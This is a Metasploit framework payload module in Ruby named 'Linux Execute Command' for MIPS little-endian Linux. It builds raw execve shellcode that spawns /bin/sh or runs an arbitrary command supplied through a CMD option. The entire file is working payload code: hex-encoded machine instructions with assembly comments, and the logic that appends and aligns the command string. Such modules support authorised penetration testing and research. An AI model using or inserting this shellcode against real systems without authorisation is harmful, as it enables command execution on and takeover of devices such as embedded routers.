# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 52

  include Msf::Payload::Single
  include Msf::Payload::Linux::Mipsle::Prepends

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Execute Command',
        'Description' => 'Execute an arbitrary command or just a /bin/sh shell',
        'Author' => [
          'Michael Messner <devnull[at]s3cur1ty.de>', # metasploit payload
          'entropy@phiral.net', # original payload
          'Spencer McIntyre',
          'Diego Ledda'
        ],
        'References' => [
          ['EDB', '17940']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_MIPSLE
      )
    )

    register_options([
      OptString.new('CMD', [ false, 'The command string to execute' ]),
    ])
  end

  def generate(_opts = {})
    cmd = datastore['CMD'] || ''

    if cmd.empty?
      # execve("/bin/sh", ["/bin/sh"], NULL)
      shellcode =
        "\x66\x06\x06\x24" + # li      a2, 1638
        "\xff\xff\xd0\x04" + # bltzal  a2, myself
        "\xff\xff\x06\x28" + # slti    a2, zero, -1     (delay slot, a2 = 0)
        # myself: (ra = here)
        "\xe0\xff\xbd\x27" + # addiu   sp, sp, -32
        "\x01\x10\xe4\x27" + # addiu   a0, ra, 4097
        "\x1f\xf0\x84\x24" + # addiu   a0, a0, -4065   ; a0 = &"/bin/sh"
        "\xe8\xff\xa4\xaf" + # sw      a0, -24(sp)      ; argv[0] = &"/bin/sh"
        "\xec\xff\xa0\xaf" + # sw      zero, -20(sp)    ; argv[1] = NULL
        "\xe8\xff\xa5\x27" + # addiu   a1, sp, -24      ; a1 = argv
        "\xab\x0f\x02\x24" + # li      v0, 4011         ; __NR_execve
        "\x0c\x01\x01\x01"   # syscall 0x40404
      shellcode += "/bin/sh\x00"
    else
      # execve("/bin/sh", ["/bin/sh", "-c", CMD, NULL], NULL)
      shellcode =
        "\x66\x06\x06\x24" + # li      a2, 1638
        "\xff\xff\xd0\x04" + # bltzal  a2, myself
        "\xff\xff\x06\x28" + # slti    a2, zero, -1     (delay slot, a2 = 0)
        # myself: (ra = here)
        "\xe0\xff\xbd\x27" + # addiu   sp, sp, -32
        "\x01\x10\xe4\x27" + # addiu   a0, ra, 4097
        "\x37\xf0\x84\x24" + # addiu   a0, a0, -4041   ; a0 = &"/bin/sh"
        "\xe0\xff\xa4\xaf" + # sw      a0, -32(sp)      ; argv[0] = &"/bin/sh"
        "\x01\x10\xe8\x27" + # addiu   t0, ra, 4097
        "\x3f\xf0\x08\x25" + # addiu   t0, t0, -4033   ; t0 = &"-c"
        "\xe4\xff\xa8\xaf" + # sw      t0, -28(sp)      ; argv[1] = &"-c"
        "\x01\x10\xe8\x27" + # addiu   t0, ra, 4097
        "\x43\xf0\x08\x25" + # addiu   t0, t0, -4029   ; t0 = &CMD
        "\xe8\xff\xa8\xaf" + # sw      t0, -24(sp)      ; argv[2] = &CMD
        "\xec\xff\xa0\xaf" + # sw      zero, -20(sp)    ; argv[3] = NULL
        "\xe0\xff\xa5\x27" + # addiu   a1, sp, -32      ; a1 = argv
        "\xab\x0f\x02\x24" + # li      v0, 4011         ; __NR_execve
        "\x0c\x01\x01\x01"   # syscall 0x40404
      shellcode += "/bin/sh\x00"
      shellcode += "-c\x00\x00"
      shellcode += cmd + "\x00"
    end

    # align our shellcode to 4 bytes
    shellcode += "\x00" while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
